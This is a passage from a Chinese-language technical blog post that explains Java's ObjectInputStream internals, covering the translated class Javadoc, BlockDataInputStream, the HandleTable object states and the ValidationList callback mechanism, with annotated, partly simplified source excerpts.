class="comment"> * 原始数据与对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;与 FileInputStream/FileOutputStream 搭配时，ObjectInputStream 与</span></span><br><span class="line"><span class="comment"> * ObjectOutputStream 可为应用提供对象图（graph of objects）的持久化存储；</span></span><br><span class="line"><span class="comment"> * ObjectInputStream 负责把先前序列化的对象恢复出来。其它常见用途包括：</span></span><br><span class="line"><span class="comment"> * 通过套接字在主机之间传递对象，或在远程通信系统中对参数进行编组/解组。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;ObjectInputStream 确保从流中创建的对象的实际类型与当前 Java 虚拟机中</span></span><br><span class="line"><span class="comment"> * 可用的类相匹配；所需的类会按标准类加载机制进行加载。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;只有实现了 java.io.Serializable 或 java.io.Externalizable 的对象</span></span><br><span class="line"><span class="comment"> * 才能从该流中读取。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;通过 &lt;code&gt;readObject&lt;/code&gt; 方法可以从流中读取一个对象；随后应使用</span></span><br><span class="line"><span class="comment"> * Java 的安全类型转换（cast）得到期望类型。Java 中字符串与数组本身就是对象，</span></span><br><span class="line"><span class="comment"> * 因此它们在序列化/反序列化过程中也按对象处理，读取后需要转换为期望类型。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;原始类型数据可通过 DataInput 上的相应方法从流中读取。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;对象的默认反序列化机制会把每个字段恢复为写出时的值与类型。</span></span><br><span class="line"><span class="comment"> * 被声明为 transient 或 static 的字段在反序列化过程中会被忽略。</span></span><br><span class="line"><span class="comment"> * 对其它对象的引用会在需要时递归读取，以恢复完整的对象图；</span></span><br><span class="line"><span class="comment"> * 共享引用会被正确还原。反序列化时总是分配新的对象实例，避免覆盖现有对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;读取一个对象的过程类似于“运行新对象的构造过程”：</span></span><br><span class="line"><span class="comment"> * 会为对象分配内存并以零（或 NULL）初始化；对&lt;b&gt;不可序列化&lt;/b&gt;的超类会调用其</span></span><br><span class="line"><span class="comment"> * 无参构造方法；随后按层级从靠近 java.lang.Object 的可序列化类开始，</span></span><br><span class="line"><span class="comment"> * 一直到最具体的类，依次从流中恢复各层的字段。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;示例（读取由 ObjectOutputStream 示例写出的数据）：</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *      FileInputStream fis = new FileInputStream(&quot;t.tmp&quot;);</span></span><br><span class="line"><span class="comment"> *      ObjectInputStream ois = new ObjectInputStream(fis);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      int i = ois.readInt();</span></span><br><span class="line"><span class="comment"> *      String today = (String) ois.readObject();</span></span><br><span class="line"><span class="comment"> *      Date date = (Date) ois.readObject();</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      ois.close();</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;类可通过实现 java.io.Serializable 或 java.io.Externalizable 来控制</span></span><br><span class="line"><span class="comment"> * 自身的序列化方式。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现 Serializable 允许在保存/恢复对象全部状态的同时，支持类在写出与读入</span></span><br><span class="line"><span class="comment"> * 期间的演进（evolution）。序列化会自动遍历对象之间的引用，从而保存/恢复整个对象图。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;在序列化/反序列化过程中需要特殊处理的可序列化类，应实现以下私有方法：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * private void writeObject(java.io.ObjectOutputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException;</span></span><br><span class="line"><span class="comment"> * private void readObject(java.io.ObjectInputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException, ClassNotFoundException;</span></span><br><span class="line"><span class="comment"> * private void readObjectNoData()</span></span><br><span class="line"><span class="comment"> *     throws ObjectStreamException;</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;readObject 负责使用对应 writeObject 写入到流中的数据，读取并恢复其</span></span><br><span class="line"><span class="comment"> * 所在&lt;b&gt;这一层类&lt;/b&gt;的状态；它无需关心其超类或子类的状态。</span></span><br><span class="line"><span class="comment"> * 恢复的方式是从 ObjectInputStream 读取每个字段的数据，并把它们赋给对象中</span></span><br><span class="line"><span class="comment"> * 对应的字段。读取原始类型数据可使用 DataInput 提供的方法。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;任何企图读取超出对应 writeObject 方法自定义数据边界的对象数据，都会抛出</span></span><br><span class="line"><span class="comment"> * OptionalDataException，且其中的 eof 字段值为 true。</span></span><br><span class="line"><span class="comment"> * 如果是“非对象读”（如按字节读或读原始类型）越过了分配的数据末尾，</span></span><br><span class="line"><span class="comment"> * 行为与到达流末尾一致：按字节读会返回 -1，原始类型读会抛 EOFException。</span></span><br><span class="line"><span class="comment"> * 若不存在对应的 writeObject 方法，则“默认序列化数据”的结束标志为该层数据的终点。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;在 readExternal 方法内部发起的原始/对象读取调用，其行为相同——若流的位置</span></span><br><span class="line"><span class="comment"> * 已经位于对应 writeExternal 方法写入数据的末尾：对象读取会抛出</span></span><br><span class="line"><span class="comment"> * OptionalDataException 且 eof 为 true；按字节读返回 -1；原始类型读抛 EOFException。</span></span><br><span class="line"><span class="comment"> * 需要注意的是：对于使用旧协议</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;ObjectStreamConstants.PROTOCOL_VERSION_1&lt;/code&gt; 写入的流，该行为并不成立，</span></span><br><span class="line"><span class="comment"> * 因为该协议下 writeExternal 写入的数据结尾没有明确界定，因而无法检测。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;readObjectNoData 用于在反序列化流&lt;b&gt;并未&lt;/b&gt;把某个给定类列为所读对象的</span></span><br><span class="line"><span class="comment"> * 超类时，初始化该类自己的状态。这可能发生在接收方使用了不同版本的类定义，</span></span><br><span class="line"><span class="comment"> * 且接收方的版本继承了一些发送方版本未继承的类；也可能是序列化流被篡改所致。</span></span><br><span class="line"><span class="comment"> * 因此，readObjectNoData 有助于在“恶意或不完整”的来源流下仍正确初始化对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;对于未实现 java.io.Serializable 的任何对象，序列化并不会读取或赋值其字段。</span></span><br><span class="line"><span class="comment"> * 但“不可序列化类”的子类可以是可序列化的：此时，不可序列化的那个超类必须</span></span><br><span class="line"><span class="comment"> * 具有无参构造方法以便其字段能被初始化；同时由子类负责保存/恢复该不可序列化超类</span></span><br><span class="line"><span class="comment"> * 的状态。通常这些字段是可访问的（public/package/protected），或者可以通过</span></span><br><span class="line"><span class="comment"> * getter/setter 来恢复状态。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;反序列化对象时发生的任何异常都会被 ObjectInputStream 捕获并中止读取过程。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现 Externalizable 允许对象完全控制其序列化形式的内容与格式：</span></span><br><span class="line"><span class="comment"> * 系统会分别调用 writeExternal 与 readExternal 来保存与恢复对象状态。</span></span><br><span class="line"><span class="comment"> * 当类实现了该接口后，它可以使用 ObjectOutput/ObjectInput 的所有方法读写自身状态，</span></span><br><span class="line"><span class="comment"> * 并由对象自己负责任何版本演进问题。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;枚举常量的反序列化与普通可序列化/可外部化对象不同：其序列化形式只包含</span></span><br><span class="line"><span class="comment"> * 常量名；常量的字段值不会被传输。反序列化时，ObjectInputStream 会从流中读取</span></span><br><span class="line"><span class="comment"> * 常量名，然后调用 &lt;code&gt;Enum.valueOf(Class, String)&lt;/code&gt; 以该枚举的基础类型</span></span><br><span class="line"><span class="comment"> * 与接收的常量名作为参数获得反序列化结果。与其它对象一样，枚举常量也可以作为</span></span><br><span class="line"><span class="comment"> * 随后出现的回引用（back reference）的目标。枚举常量的反序列化过程不可自定义：</span></span><br><span class="line"><span class="comment"> * 枚举类型中定义的 readObject、readObjectNoData、readResolve 方法都会被忽略；</span></span><br><span class="line"><span class="comment"> * 同样，serialPersistentFields 与 serialVersionUID 声明也会被忽略——</span></span><br><span class="line"><span class="comment"> * 所有枚举类型的 serialVersionUID 固定为 0L。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Mike Warres</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Roger Riggs</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.DataInput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Serializable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> &lt;a href=&quot;../../../platform/serialization/spec/input.html&quot;&gt;</span></span><br><span class="line"><span class="comment"> *      Object Serialization Specification, Section 3, Object Input Classes&lt;/a&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectInputStream</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">InputStream</span> <span class="keyword">implements</span> <span class="title class_">ObjectInput</span>, ObjectStreamConstants</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="块输入流：BlockDataInputStream"><a href="#块输入流：BlockDataInputStream" class="headerlink" title="块输入流：BlockDataInputStream"></a>块输入流：BlockDataInputStream</h3><p>与 <code>BlockDataOutputStream</code> 对应，<code>BlockDataInputStream</code> 把“协议里的块数据”抽象为连续字节源；需要时切换“非块模式”读取类型码&#x2F;长度等结构化标记。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> BlockDataInputStream bin;</span><br></pre></td></tr></table></figure></div>

<h3 id="对象句柄表：HandleTable"><a href="#对象句柄表：HandleTable" class="headerlink" title="对象句柄表：HandleTable"></a>对象句柄表：HandleTable</h3><p><code>ObjectInputStream</code> 在反序列化时会维护 <strong>wire handle（从 <code>0x7E0000</code> 起）→{对象 | 异常}</strong> 的映射及<strong>读取状态</strong>，从而确保正确实现 <code>TC_REFERENCE</code> 的回引、<strong>循环引用</strong>、以及异常传播。</p>
<p>维护上述内容的结构是对象句柄表 <code>HandleTable</code>。在该句柄表中，对象的状态有下面几种形式：</p>
<ul>
<li><code>UNREAD</code>：刚分配句柄，占位；</li>
<li><code>READING</code>：正在构造&#x2F;填充该对象（处理自引用&#x2F;循环引用时会先发句柄）；</li>
<li><code>DEFAULTED</code>：降级&#x2F;默认化（少见）；</li>
<li><code>OK</code>：完成，可正常回引。</li>
</ul>
<p>通过 <code>HandleTable</code>，我们可以确保循环引用的对象可以正常反序列化出来，例如：</p>
<p>当某对象 <code>A</code> 字段里引用了 <code>B</code>，而 <code>B</code> 又在构造中引用回 <code>A</code>：OIS 会先给 <code>A</code> 分配句柄并置 <code>READING</code>，构造 <code>A</code> 时读到 <code>B</code>，再为 <code>B</code> 分配句柄……当 <code>B</code> 里回引 <code>A</code> 时，通过 <code>TC_REFERENCE</code> 取到 <code>A</code> 的<strong>占位对象</strong>，从而闭环。</p>
<p><code>HandleTable</code> 的常见操作如下：</p>
<ul>
<li><code>assign(...)</code>：<strong>为“将要被读取的那个新对象”</strong>占个坑，返回它的句柄 <strong>H</strong>，状态置 <code>READING</code>（或实现里先 <code>UNREAD</code>，马上变 <code>READING</code>）。</li>
<li><code>markDependency(dependent, target)</code>：<strong>当前在读的对象（dependent&#x3D;父&#x2F;宿主）依赖 target（子&#x2F;被引用）</strong>。真正代码里“当前在读”的句柄就是 <code>passHandle</code>。</li>
<li><code>setObject(H, obj)</code>：把 <strong>H 这个坑里</strong>塞上<strong>最终对象</strong>。</li>
<li><code>setException(H, ex)</code>：把 <strong>H 这个坑</strong>标记成<strong>失败异常</strong>（根因）。</li>
<li><code>finish(H)</code>：把 <strong>H</strong> 的状态从 <code>READING</code> 收尾到 <code>OK</code>，并处理“等它的人”。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1) 为“将读的这个对象”先分配一个句柄 H</span></span><br><span class="line"><span class="type">int</span> <span class="variable">H</span> <span class="operator">=</span> handles.assign(unshared ? UNSHARED_SENTINEL : PLACEHOLDER);</span><br><span class="line"><span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> passHandle;            <span class="comment">// 记住老的“当前对象”</span></span><br><span class="line">passHandle = H;                     <span class="comment">// 现在 H 是“当前对象”</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 2) 读 classDesc，newInstance，准备字段访问器...</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> desc.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 读各层 classdata（可能递归读很多“子对象”）</span></span><br><span class="line">    <span class="comment">//    期间每遇到一个“子对象/回引”，都会：</span></span><br><span class="line">    <span class="comment">//    - 为子对象 assign 子句柄 H_child</span></span><br><span class="line">    <span class="comment">//    - markDependency(H ← H_child)</span></span><br><span class="line">    <span class="comment">//    - 读完子对象后 setObject/finish(H_child)</span></span><br><span class="line">    readClassData(obj, desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 有 readResolve 就替换</span></span><br><span class="line">    obj = desc.maybeReadResolve(obj);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 当前对象成功落地</span></span><br><span class="line">    handles.setObject(H, obj);</span><br><span class="line">    handles.finish(H);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable cause) &#123;</span><br><span class="line">    <span class="comment">// 6) 当前对象失败，根因挂在 H 上，触发“依赖我”的一起失败</span></span><br><span class="line">    handles.setException(H, cause);</span><br><span class="line">    <span class="keyword">throw</span> abortWithWriteAborted(cause);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    passHandle = parent;            <span class="comment">// 恢复“当前对象”指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="对象图校验回调：ValidationList"><a href="#对象图校验回调：ValidationList" class="headerlink" title="对象图校验回调：ValidationList"></a>对象图校验回调：ValidationList</h3><p>在反序列化流程中，有些对象希望在 <strong>整个对象图构建完成后</strong> 再进行某些操作（例如不变量校验、反向索引恢复、跨引用修补等），这时可以调用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.registerValidation(ObjectInputValidation obj, <span class="type">int</span> priority);</span><br></pre></td></tr></table></figure></div>

<p>此时<strong>延迟回调</strong>会被登记到 <code>ObjectInputStream</code> 的一个内部队列 <code>ValidationList</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在“对象图返回给调用者之前”注册一个需要校验的对象（回调）。</span></span><br><span class="line"><span class="comment"> * 与 resolveObject 类似，但这些校验会在整个对象图完全重建之后才被调用。</span></span><br><span class="line"><span class="comment"> * 通常做法是：在某个类的 readObject 方法里把当前对象注册进流，</span></span><br><span class="line"><span class="comment"> * 等所有对象都恢复完成后，统一执行最后一组校验/修补逻辑。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  将要接收校验回调的对象（实现了 ObjectInputValidation）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> prio 回调优先级；0 是一个合适的默认值。</span></span><br><span class="line"><span class="comment"> *             数字越大越“早”执行，数字越小越“晚”执行；</span></span><br><span class="line"><span class="comment"> *             同一优先级内不保证执行顺序。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NotActiveException      当前流不处于“正在读取对象”的活动期，</span></span><br><span class="line"><span class="comment"> *                                 因而不允许注册（例如不在 readObject 调用栈中）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidObjectException  校验对象为 null 时抛出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerValidation</span><span class="params">(ObjectInputValidation obj, <span class="type">int</span> prio)</span></span><br><span class="line">    <span class="keyword">throws</span> NotActiveException, InvalidObjectException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// depth==0 表示不在任意 readObject 调用的活动期里（顶层计数器）</span></span><br><span class="line">    <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotActiveException</span>(<span class="string">&quot;stream inactive&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 交由内部的 ValidationList 以“按优先级降序”插入链表</span></span><br><span class="line">    vlist.register(obj, prio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在内部校验链表里登记回调节点。</span></span><br><span class="line"><span class="comment"> * 若回调对象为 null，抛出 InvalidObjectException。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ObjectInputValidation obj, <span class="type">int</span> priority)</span></span><br><span class="line">    <span class="keyword">throws</span> InvalidObjectException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;null callback&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以“优先级降序”插入到单链表中：</span></span><br><span class="line">    <span class="comment">// 当前节点 priority 越大，越靠前；同优先级下顺序不做保证。</span></span><br><span class="line">    <span class="type">Callback</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>, cur = list;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span> &amp;&amp; priority &lt; cur.priority) &#123;</span><br><span class="line">        prev = cur;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 捕获当前的访问控制上下文（Java 安全管理/权限模型相关），</span></span><br><span class="line">    <span class="comment">// 以便将来在回调执行时沿用同一安全上下文。</span></span><br><span class="line">    <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span> AccessController.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 prev 与 cur 之间插入新节点（或作为新表头）</span></span><br><span class="line">    <span class="keyword">if</span> (prev != <span class="literal">null</span>) &#123;</span><br><span class="line">        prev.next = <span class="keyword">new</span> <span class="title class_">Callback</span>(obj, priority, cur, acc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        list = <span class="keyword">new</span> <span class="title class_">Callback</span>(obj, priority, list, acc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对象图构建完毕后，<strong>一次性</strong>做收尾：建索引、补 transient 字段、做不变量校验等。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    depth++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(<span class="literal">false</span>); <span class="comment">// 真正读对象</span></span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">1</span>) &#123;                <span class="comment">// 最外层</span></span><br><span class="line">            vlist.doCallbacks();         <span class="comment">// 这里执行</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidObjectException e) &#123;</span><br><span class="line">        <span class="comment">// 这是 validateObject 抛出的，直接向上抛</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) vlist.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>doCallbacks</code> 会按照优先级依次调用对象的 <code>validateObject</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 触发并执行所有已注册的校验回调，随后清空回调链表。</span></span><br><span class="line"><span class="comment"> * 优先级高的（数值大）先执行；同一优先级的执行顺序不承诺。</span></span><br><span class="line"><span class="comment"> * 若任意回调抛出 InvalidObjectException，则立刻终止后续回调，</span></span><br><span class="line"><span class="comment"> * 并将该异常向上抛出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">doCallbacks</span><span class="params">()</span> <span class="keyword">throws</span> InvalidObjectException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 逐个消费链表头节点（链表在 register(...) 时已按“优先级降序”排好）</span></span><br><span class="line">        <span class="keyword">while</span> (list != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 以注册时捕获的 AccessControlContext（list.acc）作为权限上下文，</span></span><br><span class="line">            <span class="comment">// 在受控的特权块里执行回调；这里必须用 PrivilegedExceptionAction，</span></span><br><span class="line">            <span class="comment">// 因为 validateObject() 可能抛受检异常 InvalidObjectException。</span></span><br><span class="line">            AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> InvalidObjectException &#123;</span><br><span class="line">                        <span class="comment">// 真正执行校验</span></span><br><span class="line">                        list.obj.validateObject();</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">// 使用登记回调时捕获的安全上下文，确保回调在与登记时相同的权限边界内运行</span></span><br><span class="line">                list.acc</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 本节点执行完，指向下一个；逐步“消费”链表，成功路径下自然清空</span></span><br><span class="line">            list = list.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PrivilegedActionException ex) &#123;</span><br><span class="line">        <span class="comment">// 只有受检异常会被包装为 PrivilegedActionException；</span></span><br><span class="line">        <span class="comment">// 我们按约定仅传播 InvalidObjectException。</span></span><br><span class="line">        <span class="comment">// 同时将链表置空，确保“清空回调列表”的语义在异常路径也成立。</span></span><br><span class="line">        list = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">throw</span> (InvalidObjectException) ex.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将回调链表重置为初始的“空”状态。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> &#123;</span><br><span class="line">    list = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ObjectInputStream-构造函数"><a href="#ObjectInputStream-构造函数" class="headerlink" title="ObjectInputStream 构造函数"></a>ObjectInputStream 构造函数</h2><p><code>ObjectInputStream</code> 同样有两类构造函数，这里直接看有参构造函数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 